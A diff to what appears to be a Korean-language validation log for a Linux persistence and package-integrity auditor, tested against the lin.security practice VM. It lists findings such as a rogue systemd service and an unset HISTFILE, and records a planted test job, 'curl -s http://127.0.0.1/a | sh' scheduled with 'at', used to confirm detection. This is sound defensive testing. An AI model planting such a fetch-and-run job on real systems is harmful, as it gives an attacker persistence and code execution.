@@ -446,6 +446,18 @@ FS-02가 훑은 파일 수는 94,683개 (12차 94,722개 — 도구 폴더 복�
 
 lin.security 권한 상승 경로: 1단계 6개 + 2-A에서 찾은 peter docker 그룹 = **7 / 7 탐지**.
 
+
+## 21차 적용 — 2-C 지속성·패키지 무결성 (`87073a1`, 코드 해시 86784267…, 2026-11-06)
+
+기준선(`original`): 탐지 14건 — 1·2단계 10건 + 2-C 4건, 정답과 일치
+- PER-02 심각: /lib/systemd/system/debug.service — 패키지 밖, 소유자 peter, 실행 대상 /root/debug, 활성화 링크 → **권한 상승 경로 8 / 8**
+- PER-04 위험: /etc/profile 28행 `unset HISTFILE` (base-files 원본과 비교해 바뀐 줄 1개)
+- PER-09 위험: 00-header 원본과 다름. logo는 실행 권한 없음(범위), 지워진 패키지 스크립트 10개(dpkg --verify의 12개 중 2개는 obsolete 설정 파일로 보임)
+- FS-04 참고: crontab·sudoers·sysctl.d/10-ipv6-privacy.conf (설정 파일 565개 중 다름 4개·삭제 11개)
+- 정상: snap mount 2개(실행 지시어 없음), 대체 링크 48개, diversion 1개, 모듈 88개, init.d 42개
+
+양성: `echo 'curl -s http://127.0.0.1/a | sh' | at now + 1 hour` → PER-06 심각 "내려받아 바로 실행한다", 작업 파일 25행 — 일치. 이후 `original` 복원
+
 ## 검증자 활동 (auth.log에 남는 기록)
 
 탐지 결과와 섞이지 않도록 따로 적는다.
